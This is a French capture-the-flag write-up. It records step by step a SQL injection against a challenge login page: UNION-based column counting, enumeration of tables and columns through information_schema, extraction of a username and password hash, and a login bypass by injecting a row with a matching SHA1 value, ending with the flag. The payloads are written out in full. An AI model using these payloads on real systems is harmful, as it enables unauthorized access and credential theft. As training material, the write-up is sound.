En mettant: ' OR '1'='1
Je vois ceci: Wrong password for impossibletoguess.

J'ai trouvé que le nombre de colonne est de 2 via cette injection:
' UNION SELECT NULL, NULL -- 
qui me retourne Wrong password for .

Je veux trouver le nom de la BD dans laquelle est enregistré le username et password
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- 
ca retourne users

Maintenant je veux trouver le nom des colonnes
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- 
Ça retourne ceci:
Wrong password for username.
Wrong password for password.

' UNION SELECT username, NULL from users -- 
retourne impossibletoguess
' UNION SELECT password, NULL from users -- 
Wrong password for 1b2f190ad705d7c2afcac45447a31b053fada0c4


On a donc un mot de passe qui est hashed. Puis en le cherchant en ligne je ne l'ai pas trouvé.
En réfléchissant le backend fait sûrement quelque chose comme:
```php
sql_req = SELECT * FROM users WHERE username = 'username_input' and password = 'password_input'
pwd_hashed = sql_req.password
if(pwd_hashed == sha1('password_input')){
    return flag;
}
```

Avec quelque chose comme ca dans la case username et un password vide:
> username = ' union select 'impossibletoguess', sha1('') -- 
on aurait:
```php
sql_req = SELECT username, password FROM users WHERE username = '' union select 'impossibletoguess', sha1('') -- and password = 'password_input'
pwd_hashed = sql_req.password
if(pwd_hashed == sha1('')){
    return flag;
}
```
on pourrait mettre quelque chose dans le sha1 mais il faut ensuite mettre la même chose comme password dans ce cas.

FLAG-wlez73yxtkae9mpr8aerqay7or